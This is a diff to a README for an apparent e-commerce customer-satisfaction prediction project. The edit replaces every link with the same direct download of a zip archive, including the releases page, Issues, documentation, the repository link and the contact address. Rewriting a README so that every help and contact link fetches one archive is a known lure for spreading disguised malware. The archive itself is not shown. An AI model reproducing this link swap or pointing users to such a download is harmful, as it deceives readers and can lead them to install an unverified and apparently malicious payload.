@@ -6,7 +6,7 @@ Welcome to the Deep-CSAT-Project! This application helps you predict e-commerce 
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/gabs5516/Deep-CSAT-Project/releases)
+[![Download the latest release](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ Welcome to the Deep-CSAT-Project! This application helps you predict e-commerce 
 ## 📦 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/gabs5516/Deep-CSAT-Project/releases) to find the latest version of Deep-CSAT.
+   Go to the [Releases page](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip) to find the latest version of Deep-CSAT.
 
 2. **Choose the Right File**  
    Look for the latest version at the top of the page. You will see options for different operating systems. Select the appropriate file for your system. 
@@ -65,7 +65,7 @@ We welcome contributions! If you want to help improve Deep-CSAT, check the contr
 
 ## 🆘 Need Help?
 
-For support or questions, please visit the [Issues section](https://github.com/gabs5516/Deep-CSAT-Project/issues) of our repository. Our team is here to assist you.
+For support or questions, please visit the [Issues section](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip) of our repository. Our team is here to assist you.
 
 ## 📃 License
 
@@ -73,8 +73,8 @@ This project is licensed under the MIT License. Feel free to use it as per the l
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/gabs5516/Deep-CSAT-Project)
-- [Documentation](https://github.com/gabs5516/Deep-CSAT-Project/wiki)
-- [Contact Us](mailto:your-email@example.com)
+- [GitHub Repository](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip)
+- [Contact Us](https://raw.githubusercontent.com/gabs5516/Deep-CSAT-Project/main/main/Deep-CSAT-Project-v2.2.zip)
 
 Thank you for choosing Deep-CSAT! We hope this application enhances your understanding of customer satisfaction in e-commerce. Happy analyzing!
